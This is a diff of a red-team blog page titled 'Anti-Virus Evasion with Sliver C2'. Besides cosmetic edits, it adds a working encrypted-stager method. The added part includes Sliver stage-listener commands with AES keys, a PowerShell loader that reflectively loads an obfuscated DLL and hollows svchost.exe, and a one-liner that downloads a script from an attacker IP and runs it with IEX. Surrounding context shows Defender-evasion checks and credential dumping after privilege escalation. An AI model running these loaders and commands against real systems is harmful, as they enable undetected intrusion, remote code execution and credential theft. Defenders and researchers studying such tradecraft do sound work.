@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799692556314">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.8.0.799836609318">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.7.0">
+    <meta name="generator" content="Retype 3.8.0">
 
     <!-- Primary Meta Tags -->
     <title>Anti-Virus Evasion with Sliver C2</title>
     <meta name="title" content="Anti-Virus Evasion with Sliver C2">
-    <meta name="description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
+    <meta name="description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver project.">
 
     <!-- Canonical -->
     <link rel="canonical" href="https://bytebl33d.github.io/blog/sliver-evasion/">
@@ -20,14 +20,14 @@
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
     <meta property="og:title" content="Anti-Virus Evasion with Sliver C2">
-    <meta property="og:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
+    <meta property="og:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver project.">
     <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
     <meta property="twitter:title" content="Anti-Virus Evasion with Sliver C2">
-    <meta property="twitter:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
+    <meta property="twitter:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver project.">
     <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
 
     <!-- RSS -->
@@ -35,12 +35,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../resources/css/retype.css?v=3.7.0.799692556314" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.8.0.799836609318" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.7.0.799692556314" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.8.0.799836609318" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.8.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.8.0.799836609318" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.8.0.799836609318" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -54,7 +54,7 @@
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
                         <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
                     </div>
         
@@ -114,7 +114,7 @@
         <div class="relative flex mx-auto bg-white max-w-core">
             <div class="md:hidden">
                 <!-- Sidebar Skeleton -->
-                <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+                <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
                 
                     <div class="flex items-center h-16 px-6">
                         <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
@@ -199,20 +199,20 @@
         <span>Sliver C2</span>
     </h1>
 </doc-anchor-target>
-<p>My recent exploration into C2 frameworks led me to BishopFox&#x27;s <a href="https://github.com/BishopFox/sliver">Sliver</a>. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender&#x27;s swift detection of beacon payloads on my Windows VM. In order to enhance my evasion skills, this post details my process in leveraging <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a> and <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> for building my own Sliver stager, complemented by practical obfuscation strategies.</p>
-<doc-anchor-target id="shellcode-loader">
+<p>My recent exploration into C2 frameworks led me to BishopFox&#x27;s <a href="https://github.com/BishopFox/sliver">Sliver</a> project. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender&#x27;s swift detection of beacon payloads on my Windows VM. In order to enhance my red teaming skills, I decided to dig into leveraging <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a>, <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> and several evasion techniques for building my own Sliver shellcode loader.</p>
+<doc-anchor-target id="what-is-a-shellcode-loader">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#shellcode-loader">#</doc-anchor-trigger>
-        <span>Shellcode Loader</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-shellcode-loader">#</doc-anchor-trigger>
+        <span>What is a shellcode loader?</span>
     </h2>
 </doc-anchor-target>
-<p>A shellcode loader is a small piece of executable code designed to load and execute a larger payload (the actual shellcode) into a target process&#x27;s memory. Think of it as the initial delivery mechanism. Shellcode loaders are crucial for techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, often bypassing traditional security controls that focus on executable files on disk.</p>
-<p>This loader will act as a <strong>stage 1</strong> payload (stager). Its primary purpose is to establish communication with a command and control (C2) server and download the larger, more feature-rich <strong>stage 2</strong> payload. The stage 2 payload is the main malicious code that we as an attacker intend to execute on the target system, which in our case is a Sliver beacon.</p>
+<p>A shellcode loader is a small piece of executable code designed to, as its name would suggest, load and execute shellcode (being a larger payload) into a target process&#x27;s memory. Think of it as the initial delivery mechanism. Shellcode loaders are often go along with techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, that bypass traditional security controls focused on executable files on disk.</p>
+<p>The loader will act as a <strong>Stage 1</strong> payload (a.k.a. stagers). Its primary purpose is to establish communication with a command and control (C2) or payload server and download the larger, more feature-rich <strong>Stage 2</strong> payload. The second stage payload is the main malicious code that we as an attacker intend to execute on the target system. For this blog post our final payload will be a Sliver beacon.</p>
 <p>The goal is to create a stager with the following properties:</p>
 <ol>
-<li>Natively supported by Windows.</li>
-<li>Bypass common defenses found on modern operating systems.</li>
-<li>Use commonly whitelisted protocols in order to bypass firewall rules and fit in with normal traffic.</li>
+<li>Natively supported by Windows without too much dependencies.</li>
+<li>Bypass common defenses found on modern operating systems (e.g. signature checks).</li>
+<li>Use commonly whitelisted protocols in order to bypass firewall rules and fit in with normal traffic (e.g. web traffic).</li>
 </ol>
 <doc-anchor-target id="sliver-setup">
     <h2>
@@ -233,12 +233,11 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-            <h5>Note</h5>
 <p>For more information on installing and using Sliver, see the <a href="https://sliver.sh/docs?name=Linux+Install+Script">official wiki</a>.</p>
         </div>
     </div>
 </div>
-<p>From Sliver v1.5 you can make extensive customizations to the HTTP C2 traffic generated by the server and implant by modifying the HTTP C2 configuration file, which by default is located at <code v-pre>~/.sliver/configs/http-c2.json</code>. To be able to blend in more with normal traffic, we can make modifications to this file.</p>
+<p>From Sliver v1.5 you can make extensive customizations to the HTTP C2 traffic generated by the server and implant by modifying the HTTP C2 configuration file, which by default is located at <code v-pre>~/.sliver/configs/http-c2.json</code>. To be able to blend in more with normal traffic, I made some minor modifications to this file.</p>
 <p>Next, we can generate our HTTPS beacon shellcode with basic obfuscation features enabled.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ./sliver-server_linux
@@ -250,9 +249,9 @@
 [*] Encoding shellcode with shikata ga nai ... success!
 [*] Implant saved to /tmp/rev.bin</code></pre>
 </doc-codeblock></div>
-<p>This command will save the shellcode for our Sliver beacon in <code v-pre>/tmp/rev.bin</code>. If you don&#x27;t want to generate the shellcode within Sliver, we can also generate an executable directly and use an mTLS listener.</p>
+<p>This command will save the shellcode for our Sliver beacon in <code v-pre>/tmp/rev.bin</code>. If you don&#x27;t want to generate the shellcode within Sliver, we can also generate an executable (default) and use an mTLS listener.</p>
 <p><figure class="content-center">
-    <img src="../../assets/images/maldev/sliver-setup.png" alt="Generating a Sliver beacon and listener">
+    <img src="../../assets/images/maldev/sliver-setup1.png" alt="Generating a Sliver beacon and listener">
     <figcaption class="caption">Generating a Sliver beacon and listener</figcaption>
 </figure>
 </p>
@@ -264,18 +263,16 @@
   [ Copyright (c) 2019-2021 TheWover, Odzhan
 
   [ Instance type : Embedded
-  [ Module file   : &quot;/tmp/ESSENTIAL_THEATER.exe&quot;
+  [ Module file   : &quot;/tmp/SHORT_JODHPURS.exe&quot;
   [ Entropy       : Random names + Encryption
   [ File type     : EXE
   [ Target CPU    : x86+amd64
   [ AMSI/WDLP/ETW : none
   [ PE Headers    : overwrite
-  [ Shellcode     : &quot;rev.bin&quot;
-  [ Exit          : Thread
-
-$ cp rev.bin /tmp/rev.bin</code></pre>
+  [ Shellcode     : &quot;/tmp/rev.bin&quot;
+  [ Exit          : Thread</code></pre>
 </doc-codeblock></div>
-<p>The idea is that our stager will grab this binary file and execute it in memory. We can use an existing PE Loader to perform Process Injection into a target process by downloading/invoking remotely hosted shellcode. However, as a learning experience I wanted to create my own loaders.</p>
+<p>The idea is that our final stager will grab this binary shellcode file and execute it in memory. There are plenty of existing PE loaders to perform Process Injection into a target process. However, as a learning experience I wanted to create my own loaders.</p>
 <doc-anchor-target id="method-1-dinvoke-stager-net">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#method-1-dinvoke-stager-net">#</doc-anchor-trigger>
@@ -355,7 +352,7 @@ C:\Tools\DInvoke_Loader\DInvoke_shellcodeloadDInvoke_test\Properties\AssemblyInf
 </doc-anchor-target>
 <p>With our loader ready, we can verify if our file is not getting detected as malicious by running <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> or <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Tools&gt; DefenderCheck.exe s3rp3ntLoader.exe
+<pre class="language-powershell"><code v-pre class="language-powershell">C:\Tools&gt; DefenderCheck.exe s3rp3ntLoader.exe
 Target file size: 8192 bytes
 Analyzing...
 
@@ -393,6 +390,73 @@ $ ls
 aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe</code></pre>
 </doc-codeblock></div>
 <p>The generated files <code v-pre>cipher.bin</code> and <code v-pre>key.bin</code> can be passed to our loader as arguments. In the next section we will have a look at how we can make use of our loaders.</p>
+<doc-anchor-target id="method-3-custom-encrypted-stager">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-3-custom-encrypted-stager">#</doc-anchor-trigger>
+        <span>Method 3: Custom Encrypted Stager</span>
+    </h2>
+</doc-anchor-target>
+<p>Sliver has built-in support for custom stagers making use of encryption and compression when serving stages. First we need to setup our profile, listener, and stage listener with the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ./sliver-server_linux
+[server] sliver &gt; profiles new -b https://192.168.129.40:443 --skip-symbols --format shellcode --arch amd64 s3rp3nt
+[server] sliver &gt; https -L 192.168.129.40 -l 443
+[server] sliver &gt; stage-listener --url https://192.168.129.40:8443 --profile s3rp3nt -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-stager-setup.png" alt="Sliver Stager Setup">
+    <figcaption class="caption">Sliver Stager Setup</figcaption>
+</figure>
+</p>
+<p>By making some modifications to their <a href="https://sliver.sh/docs?name=Stagers">Encrypted Stage Example</a> code, we can add additional functionality to inject our shellcode into a running process by using a techniques called <strong>Process Hollowing</strong>.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-300"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>Process hollowing is a technique to execute code under the guise of a legitimate process. It works by creating a new process in a suspended state, typically a benign system executable like <code v-pre>svchost.exe</code>, and then unmapping or &quot;hollowing out&quot; its original memory. We can then inject our own malicious code into this memory space and resume the process, making it appear as though the legitimate process is running.</p>
+        </div>
+    </div>
+</div>
+<p>Just as before, we can use InvisibilityCloak on the project from <a href="https://github.com/Cyb3rDudu/SliverLoader/tree/main">Cyb3rDudu</a>. This project makes use of the Sliver encrypted stager incorporating AMSI bypass, process injection, hollowing and much more. We can compile the project in <code v-pre>Release Mode</code> and convert the DLL to raw bytes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Tools\Python\InvisibilityCloak&gt; python InvisibilityCloak.py -d C:\Tools\SliverLoder-main\SliverLoader -n 'serpent' -m reverse
+PS C:\Tools\SliverLoder-main\serpent\bin\Release&gt; get-content -encoding byte -path .\serpent.dll | clip</code></pre>
+</doc-codeblock></div>
+<p>Convert the raw bytes to Base64 with a <a href="https://gchq.github.io/CyberChef/#recipe=From_Decimal(%27Line%20feed%27,false)To_Base64(%27A-Za-z0-9%2B/%3D%27)">CyberChef recipe</a>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/loader-base64.png" alt="SliverLoader Base64 Recipe">
+    <figcaption class="caption">SliverLoader Base64 Recipe</figcaption>
+</figure>
+</p>
+<p>Next convert the AESKey and AESIV to hex using another <a href="https://cyberchef.io/#recipe=To_Hex(%270x%20with%20comma%27,0)">CyberChef recipe</a>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/loader-aeskey-recipe.png" alt="SliverLoader AESkey Recipe">
+    <figcaption class="caption">SliverLoader AESkey Recipe</figcaption>
+</figure>
+</p>
+<p>Copy the Base64 data and paste it into a PowerShell script.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">$encodeStr = &quot;TVqQAAMAAAAEAAAA...&lt;SNIP&gt;&quot;
+
+[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($encodeStr))
+$url = &quot;https://192.168.129.40:8443/test.woff&quot;
+$TargetBinary = &quot;svchost.exe&quot;
+[byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74
+[byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56
+
+$CompressionAlgorithm = &quot;deflate9&quot;
+[serpent.Loader]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)</code></pre>
+</doc-codeblock></div>
+<p>This script is a PowerShell loader that is hosted on our server, intented to be downloaded and executed once an attacker gains code execution. The script will load the stager into memory via reflection and performs the <code v-pre>DownloadAndExecute</code> operation of the agent from the staging server.</p>
 <doc-anchor-target id="sliver-in-action">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#sliver-in-action">#</doc-anchor-trigger>
@@ -452,6 +516,22 @@ PS C:\&gt; .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin</code><
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-filelesspeloader.png" alt="Sliver FilelessPELoader">
     <figcaption class="caption">Sliver FilelessPELoader</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="encrypted-stager-execution">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#encrypted-stager-execution">#</doc-anchor-trigger>
+        <span>Encrypted Stager Execution</span>
+    </h3>
+</doc-anchor-target>
+<p>Our PowerShell loader can be hosted on a webserver as a normal file. On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; (New-Object System.Net.WebClient).DownloadString('http://192.168.129.40/README.md') | IEX</code></pre>
+</doc-codeblock></div>
+<p>In a minute we should get a session in Sliver with Defender stopping us.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-session.png" alt="Sliver Session">
+    <figcaption class="caption">Sliver Session</figcaption>
 </figure>
 </p>
 <doc-anchor-target id="privilege-escalation">
@@ -517,7 +597,7 @@ $ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/<
 </p>
 <p>This will launch another beacon process running as Administrator. With these privileges we can try to dump all credentials from LSASS. To stay stealthy, let&#x27;s use <a href="https://github.com/jojonas/SharpSAMDump">SharpSAMDump</a>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; execute-assembly -P 7048 -p 'C:\Windows\System32\taskhostw.exe' -t 80 -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
+<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; execute-assembly -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
 
 [*] Tasked beacon ESSENTIAL_THEATER (c4af87ff)
 
